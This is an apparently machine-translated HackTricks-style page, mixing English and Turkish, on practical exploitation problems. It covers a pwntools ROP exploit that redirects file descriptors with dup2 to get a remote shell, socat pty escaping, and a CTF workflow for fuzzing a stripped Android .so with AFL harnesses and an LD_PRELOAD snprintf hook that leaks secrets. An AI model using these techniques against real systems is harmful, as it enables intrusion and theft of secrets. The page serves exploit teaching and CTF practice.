# Common Exploiting Problems

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

When sending an exploit to a remote server that calls **`system('/bin/sh')`** for example, this will be executed in the server process ofc, and `/bin/sh` will expect input from stdin (FD: `0`) and will print the output in stdout and stderr (FDs `1` and `2`). So the attacker won't be able to interact with the shell.

A way to fix this is to suppose that when the server started it created the **FD number `3`** (for listening) and that then, your connection is going to be in the **FD number `4`**. Therefore, it's possible to use the syscall **`dup2`** to duplicate the stdin (FD 0) and the stdout (FD 1) in the FD 4 (the one of the connection of the attacker) so it'll make feasible to contact the shell once it's executed.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Note that socat already transfers **`stdin`** and **`stdout`** to the socket. However, the `pty` mode **include DELETE characters**. So, if you send a `\x7f` ( `DELETE` -)it will **delete the previous character** of your exploit.

In order to bypass this the **escape character `\x16` must be prepended to any `\x7f` sent.**

**Burada** [**bu davranışın bir örneğini bulabilirsiniz**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

Bir Android uygulaması yalnızca stripped AArch64 `.so` ile dağıtıldığında, APK'yı yeniden derlemeden cihaz üzerinde doğrudan export edilmiş mantığı fuzz edebilirsiniz. Pratik bir iş akışı:

1. **Locate callable entry points.** `objdump -T libvalidate.so | grep -E "validate"` quickly lists exported functions. Decompilers (Ghidra, IDA, BN) reveal the real signature, e.g. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Write a standalone harness.** Load a file, keep the buffer alive, and call the exported symbol exactly as the app would. Cross-compile with the NDK (e.g. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimal dosya tabanlı harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Beklenen yapıyı yeniden oluşturun.** Ghidra'daki hata dizeleri ve karşılaştırmalar, fonksiyonun sabit anahtarlara sahip katı JSON parse ettiğini (`magic`, `version`, iç içe `root.children.*`) ve aritmetik kontroller yaptığını (ör. `value * 2 == 84` ⇒ `value` 42 olmalı) gösteriyordu. Sözdizimsel olarak geçerli JSON'u kademeli olarak her dalı karşılayacak şekilde vererek instrumentasyon olmadan şemayı haritalayabilirsiniz.
4. **Anti-debug'ı atlayarak sırları leak edin.** Çünkü `.so` `snprintf`'ı import ediyor, bunu `LD_PRELOAD` ile override ederek breakpoints engellense bile hassas format string'lerini dump edebilirsiniz:

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltrates the internal flag and confirms the crash oracle without patching the binary.
5. **Fuzz alanını daraltın.** Disassembly, flag karşılaştırması boyunca yeniden kullanılan bir XOR anahtarını ortaya çıkardı; bu, `flag`'in ilk yedi baytının bilindiği anlamına gelir. Sadece dokuz bilinmeyen baytı fuzz edin.
6. **Fuzz baytlarını geçerli bir JSON zarfı içine gömün.** AFL harness tam olarak `stdin`'den dokuz bayt okur, bunları flag suffix'e kopyalar ve diğer tüm alanları sabit kodlar (constants, tree depths, arithmetic preimage). Herhangi bir malformed read basitçe exits eder, bu yüzden AFL döngülerini anlamlı testcases üzerinde harcar.

<details>
<summary>Yapılandırılmış JSON için AFL-dostu harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **crash-as-success oracle ile AFL'yi çalıştırın.** Her semantik kontrolü geçen ve doğru dokuz baytlık soneki tahmin eden herhangi bir girdi kasıtlı çöküşü tetikler; bu dosyalar `output/crashes` dizinine düşer ve sırrı geri almak için basit harness üzerinden yeniden oynatılabilir.

Bu iş akışı, anti-debug-protected JNI doğrulayıcılarını hızlıca değerlendirmenizi, gerektiğinde sırları leak etmenizi ve ardından sadece anlamlı baytları fuzz etmenizi sağlar; üstelik orijinal APK'ya dokunmadan.

### İlgili sayfalar

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## Referanslar

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)

{{#include ../banners/hacktricks-training.md}}
